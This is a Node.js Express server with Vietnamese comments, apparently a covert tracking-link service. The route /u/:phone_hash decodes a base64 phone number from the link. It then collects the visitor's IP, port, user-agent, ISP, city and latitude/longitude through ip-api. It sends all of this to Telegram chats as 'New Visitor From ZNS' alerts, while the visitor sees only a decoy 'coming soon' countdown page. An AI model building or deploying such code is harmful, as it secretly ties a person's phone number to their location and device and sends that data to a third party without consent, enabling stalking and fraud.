const express = require('express');
const axios = require('axios');
const UAParser = require('ua-parser-js');
const rateLimit = require('express-rate-limit');
const axiosRetry = require('axios-retry');  // Import đúng cách cho phiên bản 4.x.x
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Cấu hình tin cậy proxy chỉ cho ngrok hoặc các proxy đáng tin cậy
app.set('trust proxy', 'loopback');  // Chỉ tin tưởng các proxy nội bộ

// Views / static
app.set('view engine', 'ejs');
app.set('views', __dirname + '/views');
app.use(express.static('public'));
app.use(express.json());

// Env config validation
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '1277429295d29b';  // Token của bạn
const PROXY_URL = process.env.PROXY_URL || '';
const CHAT_IDS = (process.env.CHAT_IDS || '').split(',').map(s => s.trim()).filter(Boolean);
if (!TELEGRAM_TOKEN || !PROXY_URL || CHAT_IDS.length === 0) {
  console.warn('⚠️ Warning: TELEGRAM_TOKEN, PROXY_URL or CHAT_IDS may be missing. Check .env');
}

// Rate limiter (protect /uid)
const uidLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute window
  max: 20, // Giảm số lượng yêu cầu tối đa
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => {
    console.log('Request received from IP:', getClientIP(req));
    return getClientIP(req);
  }
});

// In-memory recent IP map to throttle fast repeat (additional layer)
const recentIPs = new Map();
const RATE_LIMIT_MS = 3000; // treat < 3s as spam
const RECENT_CLEANUP_MS = 60 * 60 * 1000; // cleanup entries older than 1h

function isSpam(ip) {
  const now = Date.now();
  const last = recentIPs.get(ip) || 0;
  recentIPs.set(ip, now);
  return (now - last) < RATE_LIMIT_MS;
}

// Periodic cleanup to avoid memory growth
setInterval(() => {
  const cutoff = Date.now() - RECENT_CLEANUP_MS;
  for (const [ip, ts] of recentIPs.entries()) {
    if (ts < cutoff) recentIPs.delete(ip);
  }
}, RECENT_CLEANUP_MS);

// Helper: parse X-Forwarded-For
function getClientIP(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) {
    return xff.split(',')[0].trim();
  }
  return req.socket.remoteAddress || '127.0.0.1';
}

// Cấu hình retry cho axios
axiosRetry(axios, {
  retries: 3,  // Số lần thử lại
  retryDelay: axiosRetry.exponentialDelay,  // Thử lại với độ trễ tăng dần
  retryCondition: (error) => {
    return error.code === 'ECONNABORTED' || error.response === undefined;  // Retry khi có lỗi kết nối
  },
});

// Route: home -> coming soon
app.get('/u/:phone_hash', uidLimiter, async (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  const ipClientRaw = getClientIP(req);
  const ipClient = ipClientRaw.replace(/^::ffff:/, ''); // handle IPv4-mapped IPv6

  // Log before calling IP info API
  console.log('Fetching IP info for:', ipClient);

  let uid = 'Không có UID';
  try {
    // Lấy UID từ tham số đường dẫn
    const uidRaw = req.params.phone_hash;  // Lấy từ path parameter (ví dụ: MzozMzE3NzI4OQ==)
    if (!uidRaw) {
      return res.status(400).send('<pre>⛔ Thiếu UID – Không xử lý.</pre>');
    }

    // Throttle per-IP quick repeat
    if (isSpam(ipClient)) {
      console.log('⚠️ Spam IP:', ipClient);
      return res.status(429).send('<pre>⚠️ Truy cập quá nhanh. Vui lòng chờ giây lát.</pre>');
    }

    // Giải mã từ base64
    try {
      const decoded = Buffer.from(uidRaw, 'base64').toString('utf8');  // Giải mã từ base64
      if (!decoded || decoded.length === 0) throw new Error('empty after decode');
      uid = decoded;  // UID sau khi giải mã
    } catch (err) {
      console.warn('⚠️ UID decode failed:', err.message);
      uid = 'UID không hợp lệ';
    }

    // Log UID after processing
    console.log('Decoded UID:', uid);

    // Call ip-api with explicit IP to get real geolocation
    const ipApiUrl = `http://ip-api.com/json/${encodeURIComponent(ipClient)}?fields=status,query,isp,country,city,zip,lat,lon,timezone`;

    // Tăng timeout lên 30s
    try {
      const ipInfoRes = await axios.get(ipApiUrl, { timeout: 30000 });  // Tăng timeout lên 30 giây
      const ipInfo = ipInfoRes.data || {};

      // Log API response
      console.log('Received IP info:', ipInfo);

      // Build Telegram message (MarkdownV2 or plain - keep simple)
      const output = [
        '📥 *New Visitor From ZNS*',
        `📞 UID (SĐT): *${uid}*`,
        `🌟 IP: \`${ipClient}\` - port: \`${req.socket.remotePort}\``,
        `🌐 ISP: *${ipInfo.isp || 'Unknown'}*`,
        `📱 Device: *${userAgent}*`,
        `📍 Location: ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'} (${ipInfo.zip || '-'})`,
        `📌 Lat/Lon: ${ipInfo.lat != null && ipInfo.lon != null ? `[${ipInfo.lat}, ${ipInfo.lon}](https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon})` : 'N/A'}`,
        `🕒 Time: ${new Date().toISOString()} (${ipInfo.timezone || 'UTC'})`
      ].join('\n');

      // Send to Telegram via proxy - send in parallel
      if (PROXY_URL && TELEGRAM_TOKEN && CHAT_IDS.length) {
        await Promise.all(CHAT_IDS.map(chatId => {
          return axios.post(PROXY_URL, {
            token: TELEGRAM_TOKEN,
            chat_id: chatId,
            text: output
          }, { timeout: 5000 });
        }));
        console.log('✅ Sent notifications for UID:', uid);
      } else {
        console.warn('⚠️ Telegram not sent - missing PROXY_URL/TELEGRAM_TOKEN/CHAT_IDS');
      }

    } catch (error) {
      console.error('❌ Error while fetching IP info:', error.message);

      // Tiếp tục gửi thông báo Telegram mặc dù có lỗi
      const output = [
        '📥 *New Visitor From ZNS*',
        `📞 UID (SĐT): *${uid}*`,
        '⚠️ Không thể lấy thông tin vị trí người dùng.'
      ].join('\n');

      await Promise.all(CHAT_IDS.map(chatId => {
        return axios.post(PROXY_URL, {
          token: TELEGRAM_TOKEN,
          chat_id: chatId,
          text: output
        }, { timeout: 5000 });
      }));
      console.log('✅ Sent notification despite error');
    }
  } catch (err) {
    console.error('❌ Error while processing:', err.message);
    // Gửi thông báo mặc dù có lỗi trong khi xử lý
    const output = [
      '📥 *New Visitor From ZNS*',
      `📞 UID (SĐT): *${uid}*`,
      '⚠️ Đã xảy ra lỗi không xác định.'
    ].join('\n');

    await Promise.all(CHAT_IDS.map(chatId => {
      return axios.post(PROXY_URL, {
        token: TELEGRAM_TOKEN,
        chat_id: chatId,
        text: output
      }, { timeout: 5000 });
    }));
    console.log('✅ Sent notification despite internal error');
  }

  // Render coming soon page
  res.status(200).render('coming_soon', {
    countdownDeadline: new Date('2025-08-28T23:59:59Z').toISOString()
  });
});

// Fallback route
app.use((req, res) => {
  res.status(200).render('coming_soon', {
    countdownDeadline: new Date('2025-08-28T23:59:59Z').toISOString()
  });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
